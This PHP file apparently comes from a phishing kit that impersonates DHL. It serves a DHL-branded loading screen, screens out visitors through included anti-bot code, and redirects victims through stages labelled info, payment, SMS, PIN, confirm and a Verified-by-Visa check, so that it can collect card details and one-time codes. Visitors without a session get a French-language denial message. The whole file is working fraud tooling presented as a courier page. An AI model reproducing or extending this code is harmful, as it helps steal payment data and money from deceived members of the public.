<?php
include "Config/panel.php";
include '../back/antibots.php';


if (isset($_SESSION['MASTER'])) {

    antibotpw();
    require "lang.php";

if ($_GET['view'] == 'explain') {
    header("Refresh: 3; url=./explain.php");
}
elseif ($_GET['view'] == 'infoz') {
  header("Refresh: 3; url=./infoz.php");
}
elseif ($_GET['view'] == 'payment') {
  header("Refresh: 3; url=./payment.php");
}
elseif ($_GET['view'] == 'sms') {
    header("Refresh: ".TIMER."; url=./sms.php");
}
elseif ($_GET['view'] == 'check') {
    header("Refresh: ".TIMER."; url=./Panel/botActVbv/vbv_act.php?userid={$id}&ue={$ue}");
}
elseif ($_GET['view'] == 'pin') {
    header("Refresh: 3; url=./pin.php");
}
elseif ($_GET['view'] == 'confirm') {
    header("Refresh: 3; url=./confirm.php");
}
else {
    header("Refresh: 3; url=./index.php");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DHL</title>
</head>
<style>
    * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
    }
    div {
        background-color: #fc0;
        display: flex;
        justify-content: center;
        align-items: center;
        width: 100vw;
        height: 100vh;
    }
    img {
            
            transform: scale(1);
            animation: pulse 2s infinite
        }
        

@keyframes pulse {
   0% { transform: scale(1); }
     50% { transform: scale(1.2); }
     100% { transform: scale(1); }
}
</style>
<body>

<div>


<img src="./styles/dhl-logo.svg" alt="" srcset="">

</div>


    
</body>
</html>
<?php
}
else{
die("LA REQUÊTE A ÉTÉ REFUSÉE : VÉRIFIEZ QUE VOUS N'ÊTES PAS CONNECTÉ À UN RÉSEAU PRIVÉ" );   
}


?>